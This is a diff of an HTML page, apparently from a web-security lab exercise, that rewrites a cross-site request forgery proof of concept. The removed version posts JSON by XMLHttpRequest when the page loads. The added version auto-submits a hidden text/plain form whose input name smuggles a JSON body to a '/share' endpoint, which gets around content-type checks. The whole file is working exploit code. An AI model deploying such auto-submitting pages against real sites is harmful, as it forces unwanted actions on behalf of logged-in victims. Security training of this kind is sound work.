@@ -1,14 +1,8 @@
 <html>
-<body onload=share2()>
-  <script>
-    function share2(){
-    var user = "abc";
-    var id = 0;
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://ptl-2d63cb87-4d590bd7.libcurl.so/share", true);
-    xhr.setRequestHeader("Content-type","application/json");
-    xhr.send(JSON.stringify({user: user, id: id}));
-    }
-  </script>
+<body onload=document.getElementById("csrf").submit()>
+      <form id="csrf" action="http://ptl-2d63cb87-4d590bd7.libcurl.so/share" method="post" enctype="text/plain">
+    <input type="text" name='{"user":"abc","id":0,"ok":"' value='ad"}'>
+    </form>
+
 </body>
 </html>
